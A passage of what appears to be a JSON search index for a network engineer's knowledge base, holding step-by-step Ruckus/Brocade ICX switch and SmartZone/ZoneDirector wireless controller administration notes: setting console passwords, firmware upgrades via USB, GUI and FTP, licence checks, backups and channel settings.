for global (system-wide) parameters.</li> <li>Read-Only: Allows access to the privileged EXEC mode and CONFIG mode but only with read access.</li> </ul> <p>Note</p> <p>Passwords can be up to 32 characters long. They must begin with an alphabetic character. They can include numeric characters, the period (.), and the underscore (_) only. Passwords are case-sensitive, and they are not displayed when you enter them on the command line.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Console_Settings_Ruckus_Brocade_ICX/#configuration-mode","title":"configuration mode","text":"<p>device# configure terminal device(config)#</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Console_Settings_Ruckus_Brocade_ICX/#set-the-super-user-password","title":"set the Super User password","text":"<pre><code>device(config)# enable super-user-password joe\n</code></pre> <p>Note</p> <p>Make sure to write down the new passwords and keep the information in a secure location.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Console_Settings_Ruckus_Brocade_ICX/#set-the-port-configuration-and-read-only-passwords","title":"set the port configuration and read-only passwords","text":"<pre><code>device(config)# enable port-config-password john\ndevice(config)# enable read-only-password sam\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Firmware_upgrade_with_USB_Ruckus_Brocade_ICX/","title":"Firmware upgrade with USB Ruckus Brocade ICX","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Firmware_upgrade_with_USB_Ruckus_Brocade_ICX/#ruckus-switch-firmware-upgrade-quick-steps","title":"Ruckus Switch Firmware Upgrade \u2013 Quick Steps","text":"<ol> <li>download the new firmware from the this link [Ruckus support site].</li> <li> <p>Unzip the firmware files into the USB flash</p> <p></p> </li> <li> <p>Plug the flash drive into your switch\u2019s USB port.</p> </li> <li> <p>Console into the switch and make sure the USB drive mounts                                                      </p> <pre><code>mount disk0\n</code></pre> </li> <li> <p>Copy the bootloader software to the switch\u2019s bootrom                                                                    </p> <pre><code>copy disk0 flash mnzXXXXX.bin bootrom\n</code></pre> </li> <li> <p>Copy the firmware on your switches to the primary partition                                                              </p> <pre><code>copy disk0 flash SPSXXXXX.bin primary\n</code></pre> </li> <li> <p>Verify that the flash contents are correct                                                                                            </p> <pre><code>show flash\n</code></pre> </li> <li> <p>Make sure the switch is configured to boot from the primary flash partition                               </p> <pre><code>configuration terminal \nboot system flash primary\n</code></pre> </li> <li> <p>Verify that the configuration is set to boot from the desired partition                                                 </p> <pre><code>show run | include boot\n</code></pre> </li> <li> <p>Save the configuration                                                                                                                         </p> <pre><code>write memory\n</code></pre> </li> <li> <p>Reboot the switch                                                                                                                           </p> <pre><code>reload\n</code></pre> </li> <li> <p>Once reloaded, verify the proper firmware version is running                                                             </p> <pre><code>show version\n</code></pre> </li> </ol>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Firmware_upgrade_with_USB_Ruckus_Brocade_ICX/#ruckus-switch-firmware-upgrade-detailed-steps","title":"Ruckus Switch Firmware Upgrade \u2013 Detailed Steps","text":"<p>If you already completed the steps in the Quick Steps then no need to do this. These are the same steps, however more detailed in case needed.</p> <ol> <li> <p>Download firmware</p> <p>Confirm the current approved DCD firmware version from [Here] and find it and download it from [Ruckus support site]</p> </li> <li> <p>Unzip the firmware and put it on a flash drive</p> <p></p> <p>Sample file structure of a Ruckus switch firmware package</p> <p>A Ruckus switch firmware package will generally include files for lots of different hardware platforms but you really only need two at a time \u2013 a bootrom (bootloader) file and a firmware image.  First, extract the .zip file and navigate to the folder matching your Ruckus ICX switch family.  Then copy the bootloader file from the \u201cBoot\u201d folder and the proper firmware files out of the \u201cImages\u201d folder.  Remember to always upgrade the switch bootloader when you upgrade your primary firmware!  If you don\u2019t you could crash your switch.  In the end you should have three files on your USB drive that look similar to the following.  I\u2019ll give more details on why you need all these a little further down in the instructions.</p> <ul> <li><code>spzXXXX.bin</code> \u2013 Bootloader</li> <li><code>SPSXXXXX.bin</code> \u2013 Layer 2 firmware image (switching only)</li> <li><code>SPRXXXXX.bin</code> \u2013 Layer 3 firmware image (routing and switching \u2013 L3 features generally require an additional license)</li> </ul> <p>One final but important note \u2013 larger, modern flash drives may not work with your switch!  For some reason Ruckus switches have a hard time reading drives that are 8+ GB in capacity.  Ruckus switch firmware is small so I\u2019d recommend you use the oldest and smallest flash drive you have for this process \u2013 4GB or less in size.  Also make sure your flash drive is formatted as FAT32, otherwise you might see the following error:</p> <pre><code>ICX7150-24P Switch#mount disk0\nAre you sure?(enter 'y' or 'n'): y\nls: /dev/exusb: No such file or directory\nExternal USB disk is not plugged in or not formatted with VFAT/FAT32\n</code></pre> </li> <li> <p>Plug the USB flash drive into your switch\u2019s USB port</p> <p>This is somewhat self-explanatory.</p> </li> <li> <p>Console into the switch and verify the USB flash drive has mounted</p> <p>Usually if your flash drive is formatted properly as FAT32 it will mount automatically.  Try using the <code>show flash disk0</code> command to find out.  If the flash drive is already mounted you should see something like this:</p> <pre><code>ICX7150-24P Switch#show files disk0\nF 786944 mnz10110.bin\nF 28314668 SPR08061a.bin\nF 24723488 SPS08061a.bin\nD 4096 \n[----] disk0/System Volume Information\n53825100 bytes 3 File(s) in disk0\n</code></pre> <p>If it\u2019s NOT already mounted, try <code>mount disk0</code> and that should do the trick. If you get a mounting error then:</p> <ul> <li>make sure the flash drive is formatted as FAT32.</li> <li>make sure the flash drive has &lt; 4GB total capacity. If both those conditions are true and the drive STILL won\u2019t mount try rebooting the switch.</li> </ul> </li> <li> <p>Copy the bootloader software to the switch\u2019s bootrom</p> </li> </ol> <pre><code>copy &lt;source device&gt; &lt;destination device&gt; &lt;filename&gt; &lt;destination partition&gt;\n</code></pre> <p>For example: copy disk0 flash mnzXXXXX.bin bootrom </p> <pre><code>ICX7150-24P Switch#copy disk0 flash mnz10110.bin bootrom\nFlash Memory Write (8192 bytes per dot)\nICX7150-24P Switch#.................................................................................................\nSYNCING IMAGE TO FLASH. DO NOT SWITCH OVER OR POWER DOWN THE UNIT(65536 bytes per dot)...\n............\nCopy Done.\n</code></pre> <ol> <li> <p>Copy the primary firmware to the switch\u2019s primary flash partition     6.1. Use <code>show version</code> to find out your current firmware version, then use <code>show flash</code> to find out where that firmware is stored.     6.2. Use the copy command <code>copy flash flash [primary | secondary]</code> to put a copy of your firmware into the unused flash partition.</p> <p>Example</p> <pre><code>copy disk0 flash SPSXXXXX.bin primary\ncopy disk0 flash SPSXXXXX.bin secondary\n</code></pre> <pre><code>ICX7150-24P Switch#copy disk0 flash SPS08061a.bin primary\nICX7150-24P Switch#Load to buffer (8192 bytes per dot) .........................................\nSYNCING IMAGE TO FLASH. DO NOT SWITCH OVER OR POWER DOWN THE UNIT(65536 bytes per dot)...\n.................................................................................................\nCopy Done.\nICX7150-24P Switch#copy disk0 flash SPR08061a.bin secondary\nICX7150-24P Switch#Load to buffer (8192 bytes per dot) .......................................\nSYNCING IMAGE TO FLASH. DO NOT SWITCH OVER OR POWER DOWN THE UNIT(65536 bytes per dot)...\n................................................................................................\nCopy Done.\n</code></pre> </li> <li> <p>Verify the Flash Contents are Correct After you\u2019re done copying the firmware over, make sure everything is where you want it to be. Run <code>show flash</code></p> <pre><code>ICX7150-24P Switch#show flash\nStack unit 1:\nCompressed Pri Code size = 24723488, Version:08.0.61aT211 (SPS08061a.bin)\nCompressed Sec Code size = 28314668, Version:08.0.61aT213 (SPR08061a.bin)\nCompressed Boot-Monitor Image size = 786432, Version:10.1.10T225\nCode Flash Free Space = 1306935296\n</code></pre> </li> <li> <p>Force the Switch to Boot from Primary Flash By default, a Ruckus switch will boot any valid firmware found in its primary flash partition but It's prefered to always specify which partition to use. Use the commands below to force the switch to boot from your primary partition.</p> <pre><code>configure terminal\nboot system flash primary\nwrite memory\n</code></pre> <p>Example</p> <pre><code>ICX7150-24P Switch#configure terminal\nICX7150-24P Switch(config)#boot system flash primary\nICX7150-24P Switch(config)#write memory\n</code></pre> </li> <li> <p>Verify the Switch will Boot from the Desired Partition</p> <p>Before reloading the switch confirm which flash partition the switch will be booting from. Run <code>show running-config | include boot</code></p> <pre><code>ICX7150-24P Switch#show running-config | include boot\nboot sys fl pri\nICX7150-24P Switch(config)#\n</code></pre> </li> <li> <p>Save the Running Configuration</p> <p>Make sure to save your configuration write memory This will make sure your boot settings from the previous step are saved through the reboot.</p> <pre><code>ICX7150-24P Switch#write memory\nThere is no startup config file, unable to save legacy config\nFlash Memory Write (8192 bytes per dot)\n.\nWrite startup-config done.\nCopy Done.\nICX7150-24P Switch#\n</code></pre> </li> <li> <p>Reload the Switch</p> <p>For the firmware upgrade to take effect you have to reboot the switch, use <code>reload</code></p> <pre><code>ICX7150-24P Switch#reload\nAre you sure? (enter 'y' or 'n'): y\nCould not verify if the Running Config data has been changed.\nDo you want to continue the reload anyway? (enter 'y' or 'n'): y\nICX7150-24P Switch#Unmounting the External USB\nThe system is going down NOW!\n!\n!Reload output snipped\n!\n</code></pre> </li> <li> <p>Confirm the Upgrade</p> <p>Once the switch has reloaded make sure the correct firmware version is active. Run <code>show version</code></p> <pre><code>ICX7150-24P Switch#show version\nCopyright (c) 1996-2017 Brocade Communications Systems, Inc. All rights reserved.\nUNIT 1: compiled on Aug 14 2017 at 06:54:44 labeled as SPS08061a\n(24723488 bytes) from Primary SPS08061a.bin\nSW: Version 08.0.61aT211\nCompressed Boot-Monitor Image size = 786944, Version:10.1.10T225 (mnz10110)\nCompiled on Sun Jun 25 09:25:15 2017\n\nHW: Stackable ICX7150-24-POE\n==========================================================================\nUNIT 1: SL 1: ICX7150-24P-4X10GR POE 24-port Management Module\nSerial #:FEA3217N0LA\nCurrent License: 4X10GR\nP-ASIC 0: type B160, rev 11 Chip BCM56160_B0\n==========================================================================\nUNIT 1: SL 2: ICX7150-2X1GC 2-port 2G Module\n==========================================================================\nUNIT 1: SL 3: ICX7150-4X10GF 4-port 40G Module\n==========================================================================\n1000 MHz ARM processor ARMv7 88 MHz bus\n8192 KB boot flash memory\n2048 MB code flash memory\n1024 MB DRAM\nSTACKID 1 system uptime is 1 minute(s) 19 second(s)\nThe system started at 02:06:21 GMT+00 Wed Jan 05 2000\n\nThe system : started=cold start\n</code></pre> </li> </ol>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/SFP_Brocade_ICX-7250_ds_Ruckus_Brocade_ICX/","title":"SFP Brocade ICX-7250 ds Ruckus Brocade ICX","text":"<p>click to open PDF in new tab</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/SFP_RUCKUS_Optics_Ruckus_Brocade_ICX/","title":"SFP RUCKUS Optics Ruckus Brocade ICX","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/SFP_RUCKUS_Optics_Ruckus_Brocade_ICX/#ruckus-optics-family-data-sheet","title":"RUCKUS Optics Family Data Sheet","text":"<p>click to open PDF in new tab</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/SFP_RUCKUS_Optics_Ruckus_Brocade_ICX/#brocade-optics","title":"Brocade Optics","text":"<p>RUCKUS\u00ae ETHERNET OPTICS</p> <p>Look for the model of switch under one of the following (Product Support for 1 Gigabit Ethernet OR Product Support for 10 Gigabit Ethernet)</p> <p>For example, 7150 1GB Short haul, I am picking E1MG-SX-OM-T. Now search the document for the exact same name and look for it in the \u201cKey Standards and features\u201d</p> <p></p> <p>Now you can see what type of Fiber cable is supported on this SFP, in this case it is MMF (Multi Mode Fiber) and it is not specifying which cable exactly as in OM#. Some do specify an exact cable.</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/AP_Management_MGMT_Control_Data_Plane_Ports_Ruckus_SmartZone_SZ/","title":"AP Management MGMT Control Data Plane Ports Ruckus SmartZone SZ","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/Firmware_upgrade_Ruckus_SmartZone_SZ/","title":"Firmware upgrade Ruckus SmartZone SZ","text":"<p>IT IS YOUR RESPONSIBILITY TO READ THE OFFICIAL UPGRADE GUIDE AND RELEASE NOTES AS THEY MIGHT CONTAIN CRITICAL INFORMATION SPECIFIC TO EACH RELEASE! IF YOU IGNORE THIS STEP YOU MIGHT BREAK THE CONTROLLER AND RENDER THE SITE WITH NO WLAN CONTROLLER! </p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/Firmware_upgrade_Ruckus_SmartZone_SZ/#understanding-the-firmware-structure","title":"Understanding the Firmware structure","text":"<p>Each installed firmware will contain 3 parts and those are Control Plane, Data Plane &amp; AP Firmware. If you install Firmware Version 5.2.2.0.317 that doesn't mean that the Firmware Version number below [Pointed in yellow] is the same version. Usually, the Firmware files hold different files with different versions that apply to different parts of the upgrade.</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/Firmware_upgrade_Ruckus_SmartZone_SZ/#checking-support-licenses","title":"Checking Support Licenses","text":"<p>It is crucial to follow this step as you will not be able to perform any sort of Firmware Upgrade without active support licenses for each Node included in the SmartZone upgrade.</p> <p>Navigate to System &gt; General Settings</p> <p></p> <p>You must check how many SmartZones we have (Standalone/Cluster). In this example, I have 2 SmartZone Nodes.</p> <p></p> <p>Navigate to Administration &gt; Licenses</p> <p></p> <p>Under Installed Licenses, you must have \"SUP-Sxxx-PTNR\" Licenses equal to the number of Nodes you found in the previous General Settings section. In our example, we have 2, which means I must see 2 Support Licenses for the same Node Names. The license must be active in order to perform an update. If expired you will not be able to upgrade the firmware.</p> <p></p> <p>Even if the numbers are correct, you must do the following steps:</p> <p>1- Navigate to the next tab License Servers &gt; Click Sync Now &gt; Wait until you see a new entry in the table below with the current time and date and check if the results were successful. You will only have 1 result/row when running the sync in this tab.</p> <p></p> <p>2- Navigate back to the Installed Licenses tab &gt; Click Sync Now &gt; You will need to wait a few seconds and maybe a minute, you MUST have as many results as you have Nodes. If you have 2 nodes then you must have two results and so on... </p> <p></p> <p>In our example I had 2 Nodes, I see 2 results with the current date/time and with a successful result.</p> <p></p> <p>3- Now you must check and confirm that you have an equal amount of licenses to the number of Nodes available in this Cluster and you must confirm that the Expiration Date is a future date and the license isn't expired.</p> <p></p> <p>Only if all the above checks out you can proceed with the next steps!</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/Firmware_upgrade_Ruckus_SmartZone_SZ/#smartzone-configuration-backup","title":"SmartZone Configuration Backup","text":"<p>Log into SmartZone</p> <p></p> <p>From the sidebar menu select Administration &gt; Backup &amp; Restore</p> <p></p> <p>Under Cluster&gt; Click Back Up Entire Cluster Note that some of these backups are big in size and can be over 2GB, this will possibly take a while and might be half an hour or more. Make sure when it's completed that you can find your recent backup in the Backups History</p> <p></p> <p>Go to the next tab over Configuration Click Backup Now you will need to download that backup file, Click on the Newest dated backup entry you have and then click Download then attach it to your ticket.</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/Firmware_upgrade_Ruckus_SmartZone_SZ/#prepping-for-the-upgrade-procedure-prior-to-the-operation","title":"Prepping for the upgrade procedure prior to the operation","text":"<ul> <li>Before jumping into the upgrade itself you will need to know what sort of SmartZone you're running and what the Controller Version is.</li> <li>Navigate to System &gt; General Settings &gt; Note the Controller Version</li> </ul> <ul> <li>Based on different SmartZone models the procedure might be different. Therefore you will need to navigate to [https://support.ruckuswireless.com/documents] in order to find the correct Guide to follow. In there look for the version you are upgrading to. You will need to download any Documents or Firmware.</li> <li>Type in the search field \"SmartZone upgrade\" and you then will need to find the Guide that works with the setup you're trying to upgrade. All upgrades have to be compliant with the DCD firmware max version unless there is an exception approved by MOD.</li> </ul> <p>Your upgrade path has to support the upgrade from the current Controller Version and also has to support the SmartZone Model. You also must make sure the new firmware supports all Acess Point models on-site by reading the upgrade Document for the Firmware version you're upgrading to.</p> <p></p> <p>After downloading the document and finding the upgrade path needed, you will need to download the Firmware files from Ruckus and save them locally so they are ready for the upgrade when it's time.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/Firmware_upgrade_Ruckus_SmartZone_SZ/#important","title":"IMPORTANT!","text":"<p>As per my many implementations and based on many discussions with Ruckus, keep in mind the following:</p> <ul> <li>The SmartZone firmware and AP firmware are independent of each other, meaning that you should be able to upgrade the SmartZone and keep the APs on the old firmware and that won't affect the AP/Controller communications.</li> <li>The reason why it's important to see what APs are supported is simply so you don't upgrade an AP zone with APs that won't be supported on the new target AP Firmware, so If you have multiple Zone, you can upgrade those that contain compatible firmware and leave the Zone with the target firmware isn't compatible with them.</li> <li>Because of the previous scenario (Which contains a Zone with some unsupported APs) try to do the following:<ul> <li>Find the MAX firmware version that supports that Zone APs (Of course keeping in mind what your final target firmware is an upgrade path).</li> <li>If the final target firmware is newer than that firmware then make sure your upgrade path will work. if it works then upgrade SZ to that firmware and then upgrade the Zone(s) with those AP to that firmware, then you can continue with the upgrade path and not upgrade Zones that contain APs that are not supported by that firmware. (Reason, why do this, is simply to have the latest applicable firmware onto those APs).</li> </ul> </li> </ul> <p>Example</p> <p>You can see when I go to SZ 6.1.0 Upgrade I will be able to check the Versions you can upgrade from onto this firmware version, as well as the Supported platforms.</p> <p>You can hit the download tech document to review the detailed steps to do the upgrade.</p> <p></p> <p>After you established the firmware needed, you will need to search for that firmware version in [Ruckus Firmware Download] </p> <p>IMPORTANT MUST READ!!!</p> <p>After you locate it pay attention to further actions that might need to be implemented prior to the actual firmware upgrade. Read the release notes here and confirm all Access Points are supported. if you see like the one below where it says you need to update something, make sure you read the release notes for that link as well as it might be specific to the Access Point model or something else.</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/Firmware_upgrade_Ruckus_SmartZone_SZ/#the-upgrade-action-time","title":"The upgrade, action time!","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/Firmware_upgrade_Ruckus_SmartZone_SZ/#smartzone-firmware-upgrade-steps","title":"SmartZone Firmware Upgrade Steps","text":"<p>Once you have the firmware needed you will navigate to </p> <p>Administration &gt; Upgrade &gt; Upgrade tab &gt; click Browse &gt; choose file &gt; Click Upload</p> <p>IMPORTANT!</p> <p>While the file is being uploaded you will need to click in between the tabs (Upgrade &amp; Upgrade History) every few minutes to avoid upload timeout.</p> <p></p> <p>At some point, you might receive this popup, Click Yes</p> <p>If you get to the below figure then click Upgrade if you have already taken a backup if you didn't take a backup then click Backup &amp; Upgrade. If you didn't receive this then continue to the next figure.</p> <p></p> <p>Click Yes</p> <p></p> <p>Click Yes</p> <p></p> <p>Wait while the operation is being performed, instead of just looking at GUI which might freeze. You can CLI into the SZ and run the commands below every few minutes to check the upgrade state.</p> <pre><code>enable\nshow upgrade-state\n</code></pre> <p></p> <p>Web GUI Upgrade state...</p> <p>If at any time you feel a certain step is stuck then duplicate the web page and see if something would change.</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>Log into the SZ and confirm if the current version is the one you upgraded to, below is an example.</p> <p></p> <p>The Master node will push that firmware and the upgrade is done one by one so this might take a while. Once you regain access to GUI, you can check on the Cluster Firmware Version by navigating to System &gt; Cluster</p> <p></p> <p>You will need to click on each Cluster Node and check the next figure.</p> <p></p> <p>For Each Node that you click on. it will show its Information under Summary. Make sure all Nodes are on the New Firmware before proceeding with the next steps.</p> <p>This will show you the Control Plane Software Version which won't be the same as the Installed Firmware but it's a part of it.</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/Firmware_upgrade_Ruckus_SmartZone_SZ/#important_1","title":"IMPORTANT!!!","text":"<p>If this is a cluster, then you need to wait for all Nodes to apply the firmware. Usually, during the upgrade, you will see an Indicator for each Cluster Node with its progress.</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/Firmware_upgrade_Ruckus_SmartZone_SZ/#installing-signature-packs-sigpack-application-control","title":"Installing Signature Packs [Sigpack] / Application Control","text":"<p>You only need to do this if required, usually, you will see a mention of it on the Firmware download page. For example: When I go to download SZ 5.2.2 Firmware, It was mentioned there that before upgrading to that Firmware version, I would need to update the SigPack.</p> <p></p> <p>To update the Sigpack, follow the below steps:</p> <p>Navigate to Services &amp; Profiles </p> <p>Click Signature Package &gt; Browse &gt; Upload Wait until the package is uploaded and applied. You will not get a confirmation that it is completed and it will only take a few seconds to update.</p> <p></p> <p>Confirm the package File name / Version has been updated, you're done with this.</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/Firmware_upgrade_Ruckus_SmartZone_SZ/#ap-firmware-upgrade-steps","title":"AP Firmware Upgrade Steps","text":"<p>Now you need to upgrade the Firmware on the APs, you can do that by following the below steps:</p> <p>For each Zone, you will need to click on the Zone and then click the More option</p> <p></p> <p>Click Change AP Firmware</p> <p></p> <p>Click Upgrade</p> <p></p> <p>Click Yes</p> <p></p> <p>If you receive a warning saying the below, continue with the upgrade.</p> <pre><code>Upgrade to R5.2.2 does not support data migration (statistics, events, administrator logs). Existing system and network configuration are preserved. For further details download the 5.2.2 Release Notes before upgrading to prevent data loss\nClick OK\n</code></pre> <p></p> <p>Now all the APs will reboot twice. Once for the Firmware upgrade and another to grab their configuration, to monitor the APs who adopted the firmware you can Navigate to Access points &gt; Access points &gt; and check the APs in each Zone.</p> <p></p> <p>If you do not see the column AP Firmware then Click on the Wheel</p> <p></p> <p>Select AP Firmware and Click OK.</p> <p></p> <p>In order to see updated results, you will have to click on the refresh button and you can sort by clicking the AP Firmware to see what's on new or old firmware until all is completed.</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/Firmware_upgrade_Ruckus_SmartZone_SZ/#backup-after-the-upgrade-steps","title":"Backup After the upgrade Steps","text":"<p>Now that we have completed the upgrade you need to take both Cluster and Configuration backup on the new firmware.</p> <p>Navigate to Administration &gt; Backup &amp; Restore</p> <p></p> <p>Cluster Tab &gt; Click Back Up Entire Cluster and wait until it's completed. You should see the new dates entry when completed.</p> <p></p> <p>Configuration Tab &gt; Click Backup and wait until it's completed. You should see the new dates entry when completed.</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/Firmware_upgrade_Ruckus_SmartZone_SZ/#troubleshooting","title":"Troubleshooting","text":"<ul> <li>If for some reason you encountered some issues with the upgrade, go back - to the Firmware Upgrade Guide located at (Ruckus Support)[https://support.ruckuswireless.- com/documents] and look for the section named [Before Upgrading to This - Release]. This section might include some important TSB (Technical service - bulletin) information.</li> <li></li> <li>For issues that require rolling back, read the [Rolling Back to a Previous - Software Version] section.</li> <li>In the release notes located on the firmware download page, you will find - information about known issues and Workarounds under the section [Known - Issues].</li> <li>You can call Ruckus TAC for assistance with any problems 855 782 5871</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/General_Cluster_Upgrade_and_backup_Ruckus_SmartZone_SZ/","title":"General Cluster Upgrade and backup Ruckus SmartZone SZ","text":"<p>It is recommended that AP Firmware version should be same as DP [Data lan] version. The same versions of AP(s) and DP(s) could ensure a onsistent agreement on functional communication.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/General_Cluster_Upgrade_and_backup_Ruckus_SmartZone_SZ/#general-commands","title":"General commands","text":"<p>Those are commands I generally use to make certain checks</p> <pre><code>show version\n\nshow alarm\n\n#show resource usage\nshow meminfo\nshow diskinfo\n\n#usually after rebooting a SmartZone it takes a while to have all services running, thise can be seen more in multi node clusters.\nshow service\nservice start\n\n#check on the control plane\nshow control-plane-stats SZ-Name type cpu period 8-h\nshow control-plane-stats SZ-Name type memory period 8-h\nshow control-plane-stats SZ-Name type disk period 8-h\nshow control-plane-stats SZ-Name type port Port1 period 8-h\nshow control-plane-stats SZ-Name type interface control period 8-h\n\nen\ndiagnostics\nshow snap (show previous snap shots)\nexecute all (create new snap shot)\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/General_Cluster_Upgrade_and_backup_Ruckus_SmartZone_SZ/#copying-backup-through-ftp","title":"copying backup through FTP","text":"<pre><code>copy backup \ncopy backup-config \ncopy backup-network \n\nupgrade ftp://ftpuser:ftpuser123@&lt;IP Address&gt;/FileName\n\nupgrade ftp://ftpuser:@10.10.10.52/scge-installer_5.2.0.0.699.ximg\nupgrade ftp://ftpuser:ftpuser123@10.10.10.52/scge-installer_6.1.0.0.935.ximg\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/General_Cluster_Upgrade_and_backup_Ruckus_SmartZone_SZ/#check-upgrade-history-state","title":"check upgrade history &amp; state","text":"<p>Usually I run upgrades through GUI and I then check on progress through CLI, simply because I found CLI is more accurate and updated and didn't experience any issues while using it this way.</p> <pre><code>show upgrade-history\nshow upgrade-state\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/SZ_SmartZone/General_Cluster_Upgrade_and_backup_Ruckus_SmartZone_SZ/#show-backup-restore","title":"show backup &amp; restore","text":"<pre><code>show backup\nrestore\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/CLI_Ruckus_ZoneDirector_ZD/","title":"CLI Ruckus ZoneDirector ZD","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/CLI_Ruckus_ZoneDirector_ZD/#zd-ap-firmware-compatability-to-join-zd","title":"ZD AP Firmware Compatability to Join ZD","text":"<p>ZD firmware version 9.13.x or lower &gt; AP with Standalone Firmware 100.x is supported. ZD firmware version 10.x or later   &gt; AP with Standalone Firmware 104.x or above is supported.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/CLI_Ruckus_ZoneDirector_ZD/#firmware-upgrade","title":"Firmware upgrade","text":"<pre><code>enable\nconfig\nsystem\nftp\nftp-anon\n\nshow sysinfo\n\ndebug\nsave config X.X.X.X backup\n\nfw_upgrade -p ftp -s 10.121.147.129 -n zd1200_10.1.2.0.318.ap_10.1.2.0.318.img \n</code></pre> <p>fw_upgrade options</p> <pre><code>fw_upgrade\n            Upgrade the controller\u2019s firmware\n            protocol\n            Protocol for image transfer (FTP, TFTP, HTTP, KERMIT)\n            OPTIONS\n                -p  protocol\n                -s  server IP address or name\n                -n  image name with path on the server\n                -f  non-verbose mode\n                -h  fw_upgrade help message\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/CLI_Ruckus_ZoneDirector_ZD/#ftp","title":"FTP","text":"<p>Type in the following commands to enable and disable the FTP as well as FTP anonymous.</p> <pre><code>en    \nconfig\nsystem\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/CLI_Ruckus_ZoneDirector_ZD/#enable-ftp","title":"Enable ftp","text":"<pre><code>ruckus(config-sys)# ftp\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/CLI_Ruckus_ZoneDirector_ZD/#disable-ftp","title":"Disable ftp","text":"<pre><code>ruckus(config-sys)# no ftp\nThe FTP access has been disabled.\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/CLI_Ruckus_ZoneDirector_ZD/#enable-ftp-login-anonymous","title":"Enable ftp login anonymous","text":"<pre><code>ruckus(config-sys)# ftp-anon\nThe FTP anonymous access has been enabled.\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/CLI_Ruckus_ZoneDirector_ZD/#disable-ftp-login-anonymous","title":"Disable ftp login anonymous","text":"<pre><code>ruckus(config-sys)# no ftp-anon\nThe FTP anonymous access has been disabled.\n</code></pre> <p>Please make sure that you enable ftp in case you need to upgrade the firmware anytime. Anonymous FTP can stay disabled for ZD/AP upgrade.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/CLI_Ruckus_ZoneDirector_ZD/#enable-lldp","title":"Enable LLDP","text":"<pre><code>enable\nconfig\nap-group \"xxxx\"\nlldp enable\nexit\nexit\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/CLI_Ruckus_ZoneDirector_ZD/#renaming-aps","title":"Renaming APs","text":"<pre><code>enable\nconfig\nap xx:xx:xx:xx:xx\nlocation xxxxx\ndevname xxxx\nexit\nexit\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/Channelization_Ruckus_ZoneDirector_ZD_/","title":"Channelization Ruckus ZoneDirector ZD","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/Channelization_Ruckus_ZoneDirector_ZD_/#wlan","title":"WLAN","text":"<p>Select the WLAN you want to edit &gt; click Edit Expand \"Advanced Options\"</p> <p>locate the following options:</p> <p>Background Scanning: uncheck Load Balancing: Check </p> <p>802.11d: Check </p> <p>OFDM Only: Check </p> <p>Depending on AP coverage this value needs to be changed as needed. If a client cannot achieve this minimum then you need to set at a lower value, you can start with 12 mbps </p> <p>Radio Resource Management: Check </p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/WLC/ZD_ZoneDirector/Channelization_Ruckus_ZoneDirector_ZD_/#access-points","title":"Access Points","text":"<p>Choose the AP Group &gt; click Edit</p> <p>Select channel override for 2.4GHz band and choose channels 1,6,11 Select channel override for 5GHz band and choose channels 36-165 Make sure you have Channelization is set to 20 Mhz width for both bands 